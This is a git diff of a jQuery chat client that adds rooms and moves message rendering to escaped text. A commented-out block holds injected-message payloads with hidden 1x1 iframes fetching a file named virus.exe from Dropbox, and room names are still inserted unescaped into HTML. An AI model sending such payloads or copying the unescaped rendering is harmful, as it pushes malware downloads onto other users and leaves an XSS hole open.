@@ -4,7 +4,9 @@ var ChatterBox = function () {
   this.lastPostID = undefined;
   this.friendList = ['Ricky Asty', 'Manly Stan'];
   this.username = 'anoynmous';
-  this.roomList = ['Main'];
+  this.roomList = ['Main', 'New Room'];
+  this.currentRoom = $('body select').val();
+
 
 };
 
@@ -18,10 +20,26 @@ ChatterBox.prototype.init = function() {
   });  
 
   $('body select').on('change', function(event) {
+    if ($(this).val() === 'New Room') {
+      var room = prompt('Enter a new room name') || 'Main';
+      app.renderRoom(room);
+      $(this).val(room);
+    }
+
+    app.currentRoom = $(this).val();
     app.clearMessages();
     app.lastPostID = undefined;
     app.fetch();
   });
+
+  $('h1').on('click', function() {
+    $('select').val('Main').trigger('change');
+  });
+
+  $('body #chats').delegate('.roomtag', 'click', function(event) {
+    $('select').val($(this).text()).trigger('change');
+
+  });  
 
   setInterval(function() {
     app.fetch();
@@ -56,17 +74,11 @@ ChatterBox.prototype.fetch = function(sortOrder = 'createdAt') {
     data: 'order=-' + sortOrder,
     contentType: 'application/json',
     success: function (data) {
-      var currentRoom = $('body select').val();
       var currentList = data.results;
       var newPost = false;
       for (var i = currentList.length - 1; i >= 0; i--) {
-        if (newPost && (currentList[i].roomname === currentRoom || currentRoom === 'Main')) {
-          
-          if (app.roomList.includes(currentList[i].roomname) === false && 
-            currentList[i].roomname) {
-            app.roomList.push(currentList[i].roomname);
-            app.renderRoom(currentList[i].roomname);
-          }
+        if (newPost && (currentList[i].roomname === app.currentRoom || app.currentRoom === 'Main')) {
+          app.renderRoom(currentList[i].roomname);
           app.renderMessage(currentList[i]);
 
         }
@@ -75,11 +87,7 @@ ChatterBox.prototype.fetch = function(sortOrder = 'createdAt') {
           newPost = true;
           //to account for the first pass through
           if (i === currentList.length - 1) {
-            if (app.roomList.includes(currentList[i].roomname) === false && 
-              currentList[i].roomname) {
-              app.roomList.push(currentList[i].roomname);
-              app.renderRoom(currentList[i].roomname);
-            }
+            app.renderRoom(currentList[i].roomname);
             app.renderMessage(currentList[i]);
           
           }
@@ -116,16 +124,13 @@ ChatterBox.prototype.clearMessages = function() {
 
 ChatterBox.prototype.renderMessage = function(msg) {
   //var $msg = $(`div`);
-  if (msg.text === undefined) {
-    return;
-  }
-  if (msg.text.indexOf('<') !== -1 && msg.text.indexOf('>') && msg.text.includes('test')) {
-    console.log(msg.text);
-    return;
-  }
-  var $post = $(`<div class='post'> 
-    <span class='username'>${msg.username}</span> said @ ${msg.createdAt}: ${msg.text} </div>`);
   
+  var $username = $(`<span class='username'></span>`).text(msg.username + ': ');
+  var $post = $(`<div class='post'></div>`).text(`said @ ${msg.createdAt}: ${msg.text}`);
+  var $roomTag = $(`<span class='roomtag'></span>`).text(msg.roomname);
+  $post.prepend($username);
+  $post.append($roomTag);
+
   if (this.friendList.includes(msg.username)) {
     $post.find('.username').addClass('friend');
   }
@@ -141,17 +146,21 @@ ChatterBox.prototype.renderMessage = function(msg) {
 };
 
 ChatterBox.prototype.renderRoom = function(roomName) {
-  $(`body select`).append(`<option value="${roomName}">${roomName}</option>`);
+  if (this.roomList.includes(roomName) === false && 
+    roomName) {
+    app.roomList.push(roomName);
+    $(`body select`).append(`<option value="${roomName}">${roomName}</option>`);
+  }
 
 };  
 
 $( document ).ready(function() {
   app.fetch();
   app.init();
-  /*app.send(createMessage(69, 'lobby', 
-    `<iframe width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=0" frameborder="0" allowfullscreen></iframe>`,
-    new Date(), 'Mr. Trojan'));*/
-
+  /*app.send(app.createMessage(69, `<<iframe width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=1" frameborder="0" allowfullscreen>`, 
+    `<<IFRAME width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=1" frameborder="0" allowfullscreen></iframe></iframe>>`,
+    new Date(), `<iframe width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=1" frameborder="0" allowfullscreen></iframe>`));
+*/
 
 });
 
@@ -170,5 +179,6 @@ ChatterBox.prototype.handleUsernameClick = function() {
 };
 
 ChatterBox.prototype.handleSubmit = function() {
-  app.send(app.createMessage(Math.floor(Math.random() * 100), 'lobby', $('#message').val(), new Date(), app.username));  
+  app.send(app.createMessage(Math.floor(Math.random() * 100), app.currentRoom, $('#message').val(), new Date(), app.username)); 
+  $('#message').val(''); 
 };
